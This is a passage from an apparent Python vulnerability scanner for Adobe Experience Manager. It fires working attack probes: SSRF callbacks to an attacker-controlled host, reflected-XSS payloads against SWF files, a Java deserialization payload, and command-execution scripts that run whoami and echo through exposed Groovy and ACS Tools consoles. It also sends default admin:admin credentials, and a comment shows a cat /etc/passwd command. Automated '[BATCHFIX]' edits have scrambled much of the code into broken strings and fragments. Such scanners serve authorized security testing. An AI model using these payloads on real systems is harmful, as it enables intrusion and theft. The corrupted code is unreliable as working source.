"""     MAKEREQUEST3 = list(pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST3)""""
    for path in itertools.chain(MAKEREQUEST1, MAKEREQUEST2, MAKEREQUEST3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/opensocialmakerequest/{2}/".format(my_host, token, encoded_orig_url)"        url = url.format(back_url)

        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": base_url}"# [BATCHFIX] Commented metadata/non-Python
"""             data = "httpMethod=GET"  # [BATCHFIX] closed string"            http_request(url, "POST", data=data, additional_headers=headers, proxy=proxy, debug=debug)"        except Exception:
            if debug:
                error("Exception while performing a check", check="ssrf_opensocial_makeRequest", url=url)"
    time.sleep(10)

    if "opensocialmakerequest" in d:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         u = base64.b16decode(d.get("opensocialmakerequest")[0]).decode()"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         f = Finding(
            "Opensocial (shindig) makeRequest","            u,
# [BATCHFIX] Commented metadata/non-Python
"""             "SSRF via Opensocial (shindig) makeRequest. Yon can specify parameters"  # [BATCHFIX] closed string"            "httpMethod, postData, headers, contentType for makeRequest.","        )

        results.append(f)

    return results


@register("swf_xss")"def swf_xss(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SWFS = (
        "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)","        "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm(document.domain)","# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath="  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#         '%5c"))%7dcatch(e)%7balert(document.domain)%7d//',"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf.res?contentPath="  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#         '%5c"))%7dcatch(e)%7balert(document.domain)%7d//',"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction="  # [BATCHFIX] closed string"        "alert(document.domain)-String","# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf.res?javascriptCallbackFunction="  # [BATCHFIX] closed string"        "alert(document.domain)-String","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?swf?movieName="  # [BATCHFIX] closed string"        "%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf.res?swf?movieName="  # [BATCHFIX] closed string"        "%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/ui/resources/swfupload/swfupload.swf?movieName="  # [BATCHFIX] closed string"        "%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/ui/resources/swfupload/swfupload.swf.res?movieName="  # [BATCHFIX] closed string"        "%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//","        "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=alert(document.domain)-window","# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix="  # [BATCHFIX] closed string"        "alert(document.domain)-window","# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf?loglevel=,firebug&movie="  # [BATCHFIX] closed string"        "%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//","# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf.res?loglevel=,firebug&movie="  # [BATCHFIX] closed string"        "%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//","# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf?stagesize=1&namespacePrefix="  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         "window[/aler/.source%2b/t/.source](document.domain)-window","# [BATCHFIX] Commented metadata/non-Python
"""         "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix="  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         "window[/aler/.source%2b/t/.source](document.domain)-window","    )

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in SWFS:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

# [BATCHFIX] Commented metadata/non-Python
#             ct = content_type(resp.headers.get("Content-Type", "))"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
#             cd = resp.headers.get("Content-Disposition", ")"  # [BATCHFIX] closed string"            if resp.status_code == 200 and ct == "application/x-shockwave-flash" and not cd:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "Reflected XSS via SWF","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "AEM exposes SWF that might be vulnerable to reflected XSS. See -"  # [BATCHFIX] closed string"                    "https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61","                )

                results.append(f)
        except Exception:
            if debug:
                error("Exception while performing a check", check="swf_xss", url=url)"
    return results


@register("externaljob_servlet")"def deser_externaljob_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

    # Generated with oisdos - java -Xmx25g -jar target/oisdos-1.0.jar ObjectArrayHeap
    DESERPAYLOAD = base64.b64decode("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=")"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     EXTERNALJOBSERVLET = itertools.product(
        ("/libs/dam/cloud/proxy", "///libs///dam///cloud///proxy"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".css","            ".js","            ".html","            ".ico","            ".png","            ".gif","            ".1.json","            "...4.2.1...json","            ".json;%0a{0}.css","            ".json;%0a{0}.html","            ".json;%0a{0}.ico","        ),
    )
    EXTERNALJOBSERVLET = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in EXTERNALJOBSERVLET)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in EXTERNALJOBSERVLET:
        url = normalize_url(base_url, path)
# [BATCHFIX] Commented metadata/non-Python
#         data = {":operation": (", "job"), "file": ("jobevent", DESERPAYLOAD, "application/octet-stream")}"  # [BATCHFIX] closed string"        headers = {"Referer": base_url}"        try:
            resp = http_request_multipart(url, data=data, additional_headers=headers, proxy=proxy, debug=debug)

            if resp.status_code == 500 and "Java heap space" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "ExternalJobServlet","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "ExternalJobServlet is vulnerable to Java untrusted data deserialization. See -"  # [BATCHFIX] closed string"                    "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=102","                )

                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="deser_externaljob_servlet", url=url)"
    return results


@register("webdav")"def exposed_webdav(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     WEBDAV = itertools.product(
        ("/crx/repository/test",),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#             ","  # [BATCHFIX] closed string"            ".json","            ".css","            ".html","            ".ico","            ";%0a{0}.css","            ";%0a{0}.html","            ";%0a{0}.ico","            "/{0}.css","            "/{0}.html","            "/{0}.ico","        ),
    )
    WEBDAV = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in WEBDAV)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in WEBDAV:
        try:
            url = normalize_url(base_url, path)
            resp = http_request(url, proxy=proxy, debug=debug)
# [BATCHFIX] Commented metadata/non-Python
#             www_authenticate = resp.headers.get("WWW-Authenticate", ").lower()"  # [BATCHFIX] closed string"            if resp.status_code == 401 and "webdav" in www_authenticate:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "WebDAV exposed","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "WebDAV might we vulnerable to CVE-2015-1833. Check it manually. See -"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""                     "http://mail-archives.apache.org/mod_mbox/jackrabbit-announce/201505.mbox/raw/"  # [BATCHFIX] closed string"                    "%3C555DA644.8080908@greenbytes.de%3E/3","                )

                results.append(f)

                break

        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_webdav", url=url)"
    return results


@register("groovy_console")"def exposed_groovy_console(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

    # 'def+proc+%3d+"cat+/etc/passwd".execute()%0d%0aprintln+proc.text'"'# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     script_content = (
# [BATCHFIX] Commented metadata/non-Python
"""         "def%20command%20%3D%20%22whoami%22%0D%0Adef%20proc%20%3D%20"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "%22%24%7Bproc.in.text%7D%22"  # [BATCHFIX] closed string"    )

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     GROOVYSCRIPT1 = itertools.product(
        ("/bin/groovyconsole/post.servlet", "///bin///groovyconsole///post.servlet"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#             ","  # [BATCHFIX] closed string"            ".css","            ".html","            ".ico","            ".json","            ".1.json","            "...4.2.1...json","            ";%0a{0}.css","            ";%0a{0}.html","            ";%0a{0}.ico","        ),
    )
    GROOVYSCRIPT1 = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in GROOVYSCRIPT1)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     GROOVYSCRIPT2 = itertools.product(
        ("/etc/groovyconsole/jcr:content.html", "///etc///groovyconsole///jcr:content.html"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#             ","  # [BATCHFIX] closed string"            "/{0}.css","            "/{0}.html","            "/{0}.ico","            "/{0}.1.json","            "/{0}...4.2.1...json","            ";%0a{0}.css","            ";%0a{0}.html","            ";%0a{0}.ico","        ),
    )
    GROOVYSCRIPT2 = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in GROOVYSCRIPT2)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     GROOVYAUDIT = itertools.product(
        ("/bin/groovyconsole/audit.servlet", "///bin///groovyconsole///audit.servlet"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#             ","  # [BATCHFIX] closed string"            ".css","            ".js","            ".html","            ".ico","            ".png","            ".json","            ".1.json","            "...4.2.1...json","            ";%0a{0}.css","            ";%0a{0}.html","            ";%0a{0}.ico","        ),
    )
    GROOVYAUDIT = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in GROOVYAUDIT)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in itertools.chain(GROOVYSCRIPT1, GROOVYSCRIPT2):
        url = normalize_url(base_url, path)
        data = "script={}".format(script_content)"        headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": base_url}"        try:
            resp = http_request(url, "POST", data=data, additional_headers=headers, proxy=proxy, debug=debug)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#             f = Finding(
                "GroovyConsole","                url,
                "Groovy console is exposed, RCE is possible. See - https://github.com/OlsonDigital/aem-groovy-console","            )

            if resp.status_code == 200:
                if "executionResult" in str(resp.content):"                    results.append(f)
                    break

                try:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""                     json.loads(resp.content.decode())["output"]"                except Exception:
                    pass
                else:
                    results.append(f)
                    break

        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_groovy_console", url=url)"
    for path in GROOVYAUDIT:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200:
                try:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""                     json.loads(resp.content.decode())["data"]"                except Exception:
                    pass
                else:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                     f = Finding(
                        "GroovyConsole","                        url,
                        "Groovy console is exposed. See - https://github.com/OlsonDigital/aem-groovy-console","                    )

                    results.append(f)
                    break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_groovy_console", url=url)"
    return results


@register("acs_tools")"def exposed_acs_tools(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     DATA = (
# [BATCHFIX] Commented metadata/non-Python
"""         "scriptdata=%0A%3C%25%40+page+import%3D%22java.io.*%22+%25%3E%0A%3C%25+%0A%09"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "Process+proc+%3D+Runtime.getRuntime().exec(%22echo+abcdef31337%22)%3B%0A%09%0A%09"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "BufferedReader+stdInput+%3D+new+BufferedReader(new+InputStreamReader(proc.getInputStream()))%3B"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "%0A%09StringBuilder+sb+%3D+new+StringBuilder()%3B%0A%09String+s+%3D+null%3B%0A%09"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "while+((s+%3D+stdInput.readLine())+!%3D+null)+%7B"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "%0A%09%09sb.append(s+%2B+%22%5C%5C%5C%5Cn%22)%3B%0A%09%7D%0A%09%0A%09"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "String+output+%3D+sb.toString()%3B%0A%25%3E%0A%3C%25%3Doutput+%25%3E&scriptext=jsp&resource="  # [BATCHFIX] closed string"    )

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     FIDDLE = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/etc/acs-tools/aem-fiddle/_jcr_content.run.html","            "/etc/acs-tools/aem-fiddle/_jcr_content.run...4.2.1...html","        ),
# [BATCHFIX] Commented metadata/non-Python
#         (", "/{0}.css", "/{0}.ico", "/a.png", "/{0}.json", "/{0}.1.json", "?{0}.css", "?{0}.ico"),"  # [BATCHFIX] closed string"    )
    FIDDLE = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in FIDDLE)"
    PREDICATES = ("/bin/acs-tools/qe/predicates.json",)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in FIDDLE:
        url = normalize_url(base_url, path)
        headers = {
            "Content-Type": "application/x-www-form-urlencoded","            "Referer": base_url,"            "Authorization": "Basic YWRtaW46YWRtaW4=","        }
        try:
            resp = http_request(url, "POST", data=DATA, additional_headers=headers, proxy=proxy, debug=debug)"
            if resp.status_code == 200 and "abcdef31337" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "ACSTools","                    url,
# [BATCHFIX] Commented metadata/non-Python
"""                     "ACS Tools Fiddle is exposed, RCE is possible. See -"  # [BATCHFIX] closed string"                    "https://adobe-consulting-services.github.io/acs-aem-tools/","                )

                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_acs_tools", url=url)"
    for path in PREDICATES:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy, debug=debug)

            if resp.status_code == 200 and "relativedaterange" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "ACSTools","                    url,
                    "ACS Tools predicates. See - https://adobe-consulting-services.github.io/acs-aem-tools/","                )

                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_acs_tools", url=url)"
    return results


def parse_args():
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     parser = argparse.ArgumentParser(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         description=(
# [BATCHFIX] Commented metadata/non-Python
"""             "AEM hacker by @0ang3el, see the slides -"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""             "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"  # [BATCHFIX] closed string"        )
    )

    parser.add_argument("-u", "--url", help="url to scan")"    parser.add_argument("--proxy", help="http and https proxy")"    parser.add_argument("--debug", action="store_true", help="debug output")"    parser.add_argument("--host", help="hostname or IP to use for back connections during SSRF detection")"    parser.add_argument("--port", type=int, default=80, help="opens port for SSRF detection")"    parser.add_argument("--workers", type=int, default=3, help="number of parallel workers")"    parser.add_argument("-H", "--header", nargs="*", help="extra http headers to attach")"    parser.add_argument("--handler", action="append", help="run specific handlers, if omitted run all handlers")"    parser.add_argument("--listhandlers", action="store_true", help="list available handlers")"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     return parser.parse_args(sys.argv[1:])""""

def run_detector(port):  # Run SSRF detector in separate thread
    def handler_factory(*args):
        return Detector(token, d, *args)

# [BATCHFIX] Commented metadata/non-Python
#     httpd = HTTPServer((", port), handler_factory)"  # [BATCHFIX] closed string"
    t = Thread(target=httpd.serve_forever)
    t.daemon = True
    t.start()

    return httpd


def main():
    global extra_headers

    args = parse_args()

    if args.listhandlers:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         print("[*] Available handlers: {0}".format(list(registered.keys())))"        sys.exit(1337)

    if args.proxy:
        p = args.proxy
        proxy = {"http": p, "https": p}"    else:
        proxy = {}

    if args.header:
        for header in args.header:
            header_data = header.split(":")"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""             extra_headers[header_data[0].strip()] = header_data[1].strip()""""    else:
        extra_headers = {}

    if not args.url:
        print("You must specify the -u parameter, bye.")"        sys.exit(1337)

    if not args.host:
        print("You must specify the --host parameter, bye.")"        sys.exit(1337)

    if not preflight(args.url, proxy):
        print("Seems that you provided bad URL. Try another one, bye.")"        sys.exit(1337)

    httpd = run_detector(args.port)

    handlers_to_run = registered.values()
    if args.handler:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         handlers_to_run = []""""
        for name in args.handler:
            handler_func = registered.get(name)
            if handler_func:
                handlers_to_run.append(handler_func)

    with concurrent.futures.ThreadPoolExecutor(args.workers) as tpe:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         futures = []""""        for check in handlers_to_run:
            my_host = "{0}:{1}".format(args.host, args.port)"            futures.append(tpe.submit(check, args.url, my_host, args.debug, proxy))

        for future in concurrent.futures.as_completed(futures):
            for finding in future.result():
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""                 print("[+] New Finding!!!")"                print("\\tName: {}".format(finding.name))"                print("\\tUrl: {}".format(finding.url))"                print("\\tDescription: {}\\n\\n".format(finding.description))"
    httpd.shutdown()


if __name__ == "__main__":"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""#     main()
